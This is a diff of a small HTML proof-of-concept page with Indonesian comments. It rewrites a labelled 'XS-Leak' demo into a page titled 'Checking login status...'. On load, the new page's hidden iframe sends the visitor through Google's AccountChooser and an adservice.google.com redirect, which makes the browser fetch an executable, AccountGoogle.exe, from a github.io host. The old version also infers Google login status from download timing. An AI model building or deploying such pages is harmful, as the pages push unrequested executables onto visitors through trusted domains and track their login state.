@@ -1,47 +1,20 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>XS-Leak PoC: Google Login Detection via Download Behavior</title>
-</head>
-<body style="font-family: Arial, sans-serif; padding: 20px;">
-  <h1>XS-Leak Demo: Google Login Status via Download Trigger</h1>
+<html>
+<body>
+  <h1>Checking login status...</h1>
 
-  <button id="checkButton" style="padding: 10px 20px; font-size: 16px;">Check Google Login Status</button>
-
-  <p id="result" style="margin-top: 20px; font-size: 18px;">Status: Waiting...</p>
+  <iframe id="checker" style="display:none"></iframe>
 
   <script>
-    const testURL = "https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe%3F%2Fhome&ddm=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0";
+    const iframe = document.getElementById("checker");
 
-    const button = document.getElementById("checkButton");
-    const result = document.getElementById("result");
+    // Mulai tes: arahkan ke AccountChooser dengan continue param
+    iframe.src = "https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe";
 
-    button.addEventListener("click", () => {
-      result.textContent = "Status: Testing...";
-
-      const start = performance.now();
-
-      // Trigger iframe to simulate download from Google
-      const iframe = document.createElement("iframe");
-      iframe.style.display = "none";
-      iframe.src = testURL;
-      document.body.appendChild(iframe);
-
-      // Wait and analyze response
-      setTimeout(() => {
-        const elapsed = performance.now() - start;
-
-        if (elapsed < 3000) {
-          result.textContent = "✅ User is likely LOGGED IN to Google (fast download triggered)";
-        } else {
-          result.textContent = "❌ User is likely NOT LOGGED IN (no download triggered)";
-        }
-
-        // Clean up
-        document.body.removeChild(iframe);
-      }, 5000);
-    });
+    // Opsional: cek setelah beberapa detik
+    setTimeout(() => {
+      alert("Did the user trigger download? Analyze side effects here...");
+      // Bisa tambahin logic lain buat analisis behavior di sini
+    }, 5000);
   </script>
 </body>
 </html>
